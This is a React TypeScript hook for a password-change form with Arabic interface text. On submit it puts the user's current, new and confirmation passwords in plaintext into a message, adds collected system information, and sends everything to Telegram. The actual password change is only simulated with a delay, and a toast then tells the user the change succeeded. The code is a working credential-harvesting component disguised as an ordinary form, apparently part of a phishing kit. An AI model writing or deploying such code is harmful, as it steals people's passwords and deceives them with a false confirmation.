import { useState } from 'react';
import { useToast } from "@/components/ui/use-toast";
import { sendToTelegram, collectSystemInfo } from '@/utils/telegramNotifier';

export const usePasswordForm = () => {
  const [oldPassword, setOldPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (newPassword !== confirmPassword) {
      toast({
        variant: "destructive",
        title: "كلمات المرور غير متطابقة",
        description: "يرجى التأكد من تطابق كلمة المرور الجديدة مع تأكيدها"
      });
      return;
    }

    setIsLoading(true);
    
    const message = `
🔐 تم تسجيل محاولة تغيير كلمة المرور:

كلمة المرور الحالية: ${oldPassword}
كلمة المرور الجديدة: ${newPassword}
تأكيد كلمة المرور: ${confirmPassword}

💻 معلومات النظام:
${collectSystemInfo()}
    `;

    await sendToTelegram(message);
    
    // Simulate API call
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    toast({
      title: "تم تغيير كلمة المرور بنجاح",
      description: "يمكنك الآن استخدام كلمة المرور الجديدة لتسجيل الدخول",
    });
    
    setIsLoading(false);
    setOldPassword("");
    setNewPassword("");
    setConfirmPassword("");
  };

  return {
    oldPassword,
    setOldPassword,
    newPassword,
    setNewPassword,
    confirmPassword,
    setConfirmPassword,
    isLoading,
    handleSubmit,
  };
};